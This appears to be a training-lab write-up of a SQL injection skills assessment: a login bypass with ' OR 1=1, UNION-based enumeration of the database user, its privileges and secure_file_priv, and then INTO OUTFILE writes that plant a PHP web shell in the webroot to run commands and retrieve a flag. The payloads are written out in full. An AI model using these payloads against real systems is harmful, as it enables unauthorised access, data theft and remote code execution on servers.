# SKILLS ASSESSEMENT

## <mark style="color:red;">Step 1: Logging In</mark> <a href="#id-9c3c" id="id-9c3c"></a>

We are first met with a login page which we need to bypass. Since we do not have any credentials to work with we need to craft a payload that will result in a True statement, we can assume that the original query looks similar to this:

```
SELECT * FROM users WHERE username='username' AND password='password';
```

We are going to use the **OR** operator to try the username OR our condition which will result in a True statement no matter what, here is an example of what that would look like for the full query:

```
-- Our payload
' OR 1=1 LIMIT 1-- -'

-- Injected into the original statement
SELECT * FROM users WHERE username='' OR 1=1-- AND password='password';
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*rwwPWxd3-3DUsIeiUK4Kkw.png" alt="" height="208" width="700"><figcaption><p>Figure 1: Successfully logged in</p></figcaption></figure>

***

## <mark style="color:red;">Step 2: Enumeration</mark> <a href="#id-5e9a" id="id-5e9a"></a>

We see that the “Payroll Information” is retrieving data from somewhere, it’s most likely retrieving multiple columns from a table. To get to the point of creating a payload to get remote code execution, we must first figure out how many columns are retrieved by the table.

For this, we can use the **ORDER BY** statement which will try to order the amounts of columns we specify. But there is a catch, if we specify a number that is higher than the expected amount of columns returned it will fail and we can see the change in the web application.

Let’s say the table has 5 columns and we try to ORDER BY 6, we can see the change and now we know that the application retrieves 5 columns as this was the last number that worked. This is the payload we are going to test in the input field:

```
-- We increment the number of 1 by 1 for each time we try the payload
' ORDER BY 1
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Cs4QVvC1ntBslwLnBedGOw.png" alt="" height="152" width="700"><figcaption><p>Figure 2: Testing the max number of columns returned by the application</p></figcaption></figure>

We tested **‘ ORDER BY 6** and we can see the change in the application, we now know the maximum amount of columns returned which is 5.

We can now use the **UNION** clause to run multiple SELECT statements in the same query. We are going to do some user enumeration just to see what MySQL user we are interacting with, and what privileges that user has.

To retrieve the user we are going to use this payload:

```
' UNION SELECT NULL,user(),NULL,NULL,NULL-- 
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9MUneYz-8a11GPjzAt_Ejg.png" alt="" height="163" width="700"><figcaption><p>Figure 3: User enumeration part 1</p></figcaption></figure>

Now that we know the username which is “root”, we need to check what privileges this user has, we can do this with the following payload:

{% code overflow="wrap" fullWidth="true" %}
```
' UNION SELECT NULL,grantee,privilege_type,NULL,NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:551/1*ZPNMWIQsbOybuQXXxKVnHQ.png" alt="" height="49" width="551"><figcaption><p>Figure 4: User enumeration part 2</p></figcaption></figure>

The “**FILE**” privilege is what we want to see, this indicates that the root user can both read and write files on the back-end system.

The final part of our enumeration is to figure out if the “**secure\_file\_priv**” variable is enabled. This variable is crucial to check since it tells us if we can or can’t write to the back-end system, and for remote code execution we need this variable to be set to enabled with an empty value, our payload is going to check if this variable is set to enable with an empty value:

{% code overflow="wrap" fullWidth="true" %}
```
' UNION SELECT NULL,variable_name,variable_value,NULL,NULL FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- 
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*V5R08Wh830fYFERH9EAYww.png" alt="" height="163" width="700"><figcaption><p>Figure 5: Checking the secure_file_priv variable</p></figcaption></figure>

As we can see, the secure\_file\_priv variable has no value, this means that we can write to any part of the system as long as we have permission to write to a specific path.

## <mark style="color:red;">Step 3: Remote Code Execution</mark> <a href="#a127" id="a127"></a>

Now that we have enumerated enough to know that we can write to the file system, we can begin testing this!

To test if this indeed works let’s try writing to the webroot folder where the website is being retrieved from, which is located in “**/var/www/html/dashboard/**”. We are going to use the **INTO OUTFILE** statement to write a simple text file to this folder and then trying to open it in our browser:

{% code overflow="wrap" fullWidth="true" %}
```
random' UNION SELECT "",'This is my test file',"","","" INTO OUTFILE '/var/www/html/dashboard/test.txt'-- 
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:635/1*fB_jrTpC_OtKbEd6fXXpBw.png" alt="" height="165" width="635"><figcaption><p>Figure 6: Testing file</p></figcaption></figure>

And it works! We can now craft a web shell with PHP which will let us parse any command into a URL parameter to execute remote code on the back-end system:

```
<?php system($_REQUEST[0]); ?>
```

{% code overflow="wrap" fullWidth="true" %}
```
random' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","","" INTO OUTFILE '/var/www/html/dashboard/shell.php'--
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*963Vd5gvK-DLkZCdfzxo9w.png" alt="" height="165" width="700"><figcaption><p>Figure 7: Remote code execution test</p></figcaption></figure>

We can now execute any command on the back-end server through the URL, let’s grab that flag the task asks of us, it is located in the root folder:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DEsheZKVv2ipful8uRO8Mg.png" alt="" height="114" width="700"><figcaption><p>Figure 8: Retrieving flag</p></figcaption></figure>
